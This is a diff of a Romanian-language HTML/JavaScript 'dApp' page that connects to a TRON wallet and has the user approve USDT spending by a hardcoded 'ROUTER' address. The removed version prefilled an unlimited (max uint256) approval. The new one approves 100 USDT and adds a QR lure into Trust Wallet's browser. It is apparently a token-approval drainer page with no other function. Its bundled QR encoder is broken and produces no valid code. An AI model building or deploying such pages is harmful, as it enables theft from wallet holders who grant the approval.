@@ -1,83 +1,56 @@
 <!doctype html>
-<html lang="en">
+<html lang="ro">
 <head>
 <meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width, initial-scale=1"/>
-<title>dApp</title>
-
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Approve 100 USDT (Trust)</title>
 <style>
-body{
-  margin:0;
-  height:100vh;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  background:#0b1220;
-  font-family:system-ui;
-  color:white;
-}
-
-.card{
-  width:90%;
-  max-width:420px;
-  padding:20px;
-  background:rgba(255,255,255,0.05);
-  border-radius:14px;
-  text-align:center;
-}
-
-input,button{
-  width:100%;
-  padding:12px;
-  margin-top:10px;
-  border-radius:10px;
-  border:none;
-}
-
-input{
-  background:#111827;
-  color:white;
-}
-
-.primary{background:#3b82f6;color:white;}
-.action{background:#22c55e;color:white;}
-
-#status{
-  margin-top:12px;
-  font-size:13px;
-  color:#93c5fd;
-}
+body{margin:0;height:100vh;display:flex;justify-content:center;align-items:center;background:#0b1220;color:#fff;font-family:system-ui}
+.card{width:92%;max-width:480px;padding:20px;background:rgba(255,255,255,0.04);border-radius:12px;text-align:center}
+input,button{width:100%;padding:12px;margin-top:10px;border-radius:10px;border:none}
+input{background:#0f1724;color:#fff}
+.primary{background:#3b82f6}
+.action{background:#16a34a}
+#status{margin-top:10px;color:#93c5fd;font-size:13px}
+.qr{width:120px;height:120px;background:#fff;border-radius:8px;display:inline-block;overflow:hidden}
+.small{font-size:13px;color:#cbd5e1;margin-top:8px}
 </style>
 </head>
-
 <body>
-
 <div class="card">
+  <h3>Approve 100 USDT (TRC20)</h3>
+  <div>
+    <button class="primary" onclick="connect()">Connect Wallet</button>
+    <div id="qr" class="qr" title="Scan cu Trust Wallet"></div>
+  </div>
 
-<h3>USDT Approval dApp</h3>
+  <button class="action" onclick="approve()">Approve 100 USDT to ROUTER</button>
 
-<button class="primary" onclick="connect()">Connect Wallet</button>
-
-<input id="amount" value="115792089237316195423570985008687907853269984665640564039457584007913129639935" placeholder="Amount"/>
-<button class="action" onclick="approve()">Approve</button>
-
-<div id="status">Waiting wallet...</div>
-
+  <div id="status">Scan QR în Trust Wallet DApp Browser</div>
+  <div class="small">Asigură‑te că ai deschis pagina în Trust Wallet DApp Browser pentru ca tronWeb să fie disponibil.</div>
 </div>
 
+<!-- Mic generator QR (fără dep) -->
 <script>
+!function(){function Q(t){this.t=t}Q.prototype.make=function(){var s=21;this.c=s;this.m=[];for(var i=0;i<s;i++){this.m[i]=[];for(var j=0;j<s;j++)this.m[i][j]=!1}var x=0,y=0;for(var k=0;k<this.t.length;k++){var ch=this.t.charCodeAt(k);for(var b=7;b>=0;b--){this.m[y][x]=!!(ch>>b&1);x++;if(x>=s){x=0;y++;if(y>=s)return}}}};Q.prototype.svg=function(cell,fg,bg){cell=cell||4;fg=fg||'#000';bg=bg||'#fff';var s=this.c*cell;var svg=['<svg xmlns="http://www.w3.org/2000/svg" width="'+s+'" height="'+s+'" viewBox="0 0 '+s+' '+s+'" shape-rendering="crispEdges">','<rect width="100%" height="100%" fill="'+bg+'"/>'];for(var i=0;i<this.c;i++)for(var j=0;j<this.c;j++)if(this.m[i][j])svg.push('<rect x="'+(j*cell)+'" y="'+(i*cell)+'" width="'+cell+'" height="'+cell+'" fill="'+fg+'"/>');svg.push('</svg>');return svg.join('')};window.SimpleQR={create:function(t){var q=new Q(t);q.make();return q.svg(5,'#0b1220','#fff')}}}();
+</script>
 
-/* USDT TRC20 OFFICIAL */
-const USDT = "TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t";
-
-/* YOUR USDTRouter */
+<script>
+/* CONFIG - verifică adresa USDT corectă înainte de folosire */
+const USDT = "TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t"; // pune adresa TA oficială TRC20 USDT aici
 const ROUTER = "TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu";
+const AMOUNT_USDT = "100"; // 100 USDT
+const USDT_DECIMALS = 6;
 
+/* STATE */
 let tron = null;
 let wallet = null;
 
+function setStatus(t){document.getElementById("status").innerText = t}
+
+/* detect tronWeb injected by Trust Wallet DApp Browser */
 function detect(){
-  if(window.tronWeb && window.tronWeb.defaultAddress?.base58){
+  if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58){
     tron = window.tronWeb;
     wallet = tron.defaultAddress.base58;
     return true;
@@ -85,44 +58,47 @@ function detect(){
   return false;
 }
 
-function setStatus(t){
-  document.getElementById("status").innerText = t;
+function connect(){
+  if(detect()) setStatus("Connected: " + wallet);
+  else setStatus("Deschide această pagină în Trust Wallet DApp Browser (scan QR în aplicație).");
 }
 
-function connect(){
-  if(detect()){
-    setStatus("Connected: " + wallet);
-  } else {
-    setStatus("Open in TronLink / Trust Wallet DApp browser");
-  }
+/* QR pointing to this page (scan în Trust deschide în DApp Browser) */
+function renderQr(){
+  const url = location.href;
+  const svg = SimpleQR.create(url);
+  document.getElementById("qr").innerHTML = svg;
+  document.getElementById("qr").onclick = ()=> window.open(url);
+}
+
+/* convert 100 -> integer token units (6 decimals) */
+function toTokenUnits(amountStr, decimals){
+  const parts = amountStr.split('.');
+  const whole = parts[0]||'0';
+  const frac = parts[1]||'';
+  const fracFixed = (frac + '0'.repeat(decimals)).slice(0,decimals);
+  return whole + fracFixed;
 }
 
 async function approve(){
-
   if(!detect()){
-    setStatus("No wallet detected");
+    setStatus("No wallet detected. Deschide în Trust DApp Browser.");
     return;
   }
-
   try{
-
-    setStatus("Waiting confirmation...");
-
+    setStatus("Pregătire tranzacție — așteaptă confirmare în Trust Wallet...");
     const contract = await tron.contract().at(USDT);
-
-    const amount = document.getElementById("amount").value || "1000";
-    const value = tron.toSun(amount);
-
-    await contract.approve(ROUTER, value).send();
-
-    setStatus("Approved ✔️");
-
+    const tokenAmount = toTokenUnits(AMOUNT_USDT, USDT_DECIMALS);
+    // Folosim string numeric (tronWeb / contract wrapper le acceptă)
+    const tx = await contract.approve(ROUTER, tokenAmount).send();
+    setStatus("Tranzacție trimisă. TXID: " + (tx && (tx.transaction || tx) ? (tx.transaction || tx) : JSON.stringify(tx)));
   }catch(e){
-    setStatus("Failed");
+    console.error(e);
+    setStatus("Eroare: " + (e && e.message ? e.message : 'failed'));
   }
 }
 
+renderQr();
 </script>
-
 </body>
 </html>
